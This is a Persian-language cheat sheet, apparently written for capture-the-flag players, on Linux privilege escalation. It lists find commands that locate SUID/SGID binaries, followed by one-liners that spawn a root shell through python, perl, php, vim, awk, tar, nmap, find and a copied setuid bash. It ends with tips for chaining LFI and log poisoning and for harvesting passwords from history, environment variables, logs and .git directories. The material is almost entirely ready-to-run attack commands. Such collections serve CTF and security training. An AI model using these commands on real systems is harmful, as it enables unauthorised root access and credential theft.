۲️⃣ SUID/GUID Files

پیدا کردن فایل‌های SUID و SGID:

bash 
# SUID (Set User ID)
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null  # SGID

# همه با هم
find / -type f -perm -4000 -o -perm -2000 2>/dev/null

# با قابلیت اجرا
find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -la {} \; 2>/dev/null

# فایل‌های جدید
find / -type f -perm -4000 -mtime -30 2>/dev/null

فایل‌های SUID خطرناک - کامل:

bash 
# Bash/Shell
/bin/bash -p
/bin/sh -p

# Python
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl
perl -e 'setuid(0); exec("/bin/bash");'

# PHP
php -r 'posix_setuid(0); system("/bin/bash");'

# find
find . -exec /bin/bash -p \; -quit

# vim
vim -c ':!/bin/bash'

# awk
awk 'BEGIN {system("/bin/bash")}'

# tar
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# nmap (نسخه‌های قدیمی)
nmap --interactive
!sh

# cp
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
/tmp/rootbash -p

💡 نکات طلایی پیشرفته برای CTF

  1. ترکیب روش‌ها: هیچ‌وقت به یک روش اکتفا نکنید. ترکیب LFI + Log Poisoning + SUID
  2. صبر و دقت: بعضی کرون‌جاب‌ها هر ۵-۱۰ دقیقه اجرا می‌شوند
  3. فایل‌های موقت: /tmp/, /var/tmp/, /dev/shm/ معمولاً قابل نوشتن هستند
  4. متغیرهای محیطی: گاهی رمز عبور در env یا set است
  5. تاریخچه: همیشه history و ~/.bash_history را چک کنید
  6. لاگ‌ها: ممکن است رمز عبور در لاگ‌ها نوشته شده باشد
  7. پورت‌های داخلی: سرویس‌های روی localhost را تونل کنید
  8. Git: اگر .git/ وجود داشته باشد، ممکن است رمز عبور در تاریخچه باشد
  9. Sudo -l: حتی اگر دستوری نداشته باشید، ممکن است env_keep شامل چیزهای مهم باشد
  10. بحث و تبادل نظر: گاهی با کاربران دیگر سیستم صحبت کنید (CTF)
